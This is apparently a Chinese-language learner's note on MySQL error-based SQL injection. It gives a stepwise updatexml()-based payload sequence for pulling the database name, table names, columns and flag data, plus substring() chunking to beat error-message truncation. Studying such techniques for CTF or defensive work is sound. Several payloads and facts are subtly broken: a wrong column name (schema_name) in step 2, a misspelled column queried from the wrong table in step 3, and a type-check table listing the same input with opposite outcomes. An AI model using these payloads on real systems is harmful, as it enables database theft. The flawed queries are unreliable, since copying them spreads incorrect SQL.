# 04 · 报错注入

> 日期：2026-09-16 | 标签：#Web安全 #SQL注入 #报错注入
> 
## 1.为什么要报错注入？
联合注入（union）需要页面有"回显位"（能显示查询结果）。

但如果目标页面**不显示查询结果，却会显示数据库报错信息**，union 就用不上——这时要用报错注入。

## 2.原理

updatexml()的第二个参数要求是合法的XPath，如果是不合法的内容，MySQL 就会报错，并且会**把传入的内容显示在报错信息里**。

```sql
-- 正常：不报错
updatexml(1, '/a/b', 1)

-- 报错：错误信息里会显示传入的字符串
updatexml(1, '~hello', 1)
-- 结果：XPATH syntax error: '~hello'

-- 把固定内容换成查询，数据就被带出来了
updatexml(1, concat(0x7e, database()), 1)
-- 结果：XPATH syntax error: '~sqli'
```
## 3，完整操作流程与payload

**第0步：判断注入类型（类型判断错，payload就会失效）**

|输入|结果|结论|
|---|---|---|
|1'|报错|字符型(payload要加`'`和注释符 # )|
|1'|不报错| 整数型（payload 不加 `'`）|

**第1步：查库名**
```sql
1 and updatexml(1,concat(0x7e,database()),1)
```
**第2步：查表名**
```
1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where schema_name=database() limit 0,1)),1)
```
**第3步：查字段**
```
1 and updatexml(1,concat(0x7e,(select coclumn_name from information_schema.tables where table_name='flag' limit 0,1)),1)
```
**第4步：取数据**
```
1 and updatexml(1,concat(0x7e,(select flag from flag)),1)
```
**第5步：数据太长时用substring分段取**

报错信息只有约 32 个字符，一次显示不完，所以分段读取：

```
-- 第 1 段（第 1~31 个字符）
1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,31)),1) 

-- 第 2 段（第 32 个字符开始）
1 and updatexml(1,concat(0x7e,substring((select flag from flag),32,31)),1) 
```

每次把起始位置往后移 31（1 → 32 → 63 → ...），最后拼接起来

## 4.用到的函数

| 函数/符号 | 作用 |
|---|---|
| `updatexml(1, X, 1)` | 制造报错的函数，X 就是你要带出来的内容 |
| `extractvalue(1, X)` | 作用类似的备用函数 |
| `concat(a, b)` | 把两段内容拼成一个字符串 |
| `group_concat(列)` | 把**多行**的值拼成一行（和 concat 方向不同） |
| `0x7e` | 就是 `~`，用来标记"数据从这里开始"，方便识别 |
| `limit 0,1` | 跳过 0 条，取 1 条（第一个数字从 0 开始数） |
| `substring(字符串, 起始位置, 长度)` | 分段截取（位置从 1 开始数） |
| `#` | MySQL 注释符，把后面多余的内容注释掉 |

## 5. 我提出的疑问与解答

**Q1：报错注入到底是干嘛的？**

A：把数据通过"错误信息"这个渠道显示出来。联合注入走"查询结果显示区"，报错注入走"错误提示区"。

**Q2：`concat` 和 `group_concat` 有什么区别？**

A：`concat` 是**横向**拼接同一行的多个值（行数不变）；`group_concat` 是**纵向**把多行的同一个值收成一行（多行变一行，默认逗号分隔）。

**Q3：`limit 0,1` 和 `limit 1,1` 是什么意思？有 `limit 1,0` 吗？**

A：`limit 第一个数字, 第二个数字` = 跳过几条, 取几条。第一个数字从 0 开始数。
- `limit 0,1` = 跳过 0 条取 1 条 → 第 1 行
- `limit 1,1` = 跳过 1 条取 1 条 → 第 2 行
- `limit 1,0` = 语法合法，但取 0 条 → 返回空，没有实际意义

**Q4：为什么要先判断整数型还是字符型？**

A：因为 payload 写法不同。字符型要闭合引号（加 `'`）并注释掉多余引号；整数型不用。用错了会语法错误，什么都查不到。

**Q5：为什么数据被截断了？**

A：`updatexml` 的报错信息长度有限（约 32 字符），所以要用 `substring()` 分段取出再拼接。

**Q6：payload是什么意思**

A：payload 中文叫"载荷"，在安全圈的意思是：攻击者构造的那段"用来实现攻击目的的输入内容"

## 7. 踩坑记录

- 一开始直接抄 payload 没先判断注入类型，导致一直查不出数据；后来先输入 `1'` 确认是字符型
- `updatexml` 报错信息长度有限，第一次只拿到 flag 的前半段，需要用 `substring()` 分段取
## 8.我的理解
报错注入和联合注入都是在"把数据带到页面"，只是走的通道不同；报错信息长度有限，所以要分段读取。
## 9.小结
 报错注入适用于：**有注入点、页面会显示报错、但没有回显位**
- 核心思路：**制造错误，让数据随错误信息一起显示**
- 关键技巧：`substring()` 分段读取 + `limit` 翻页
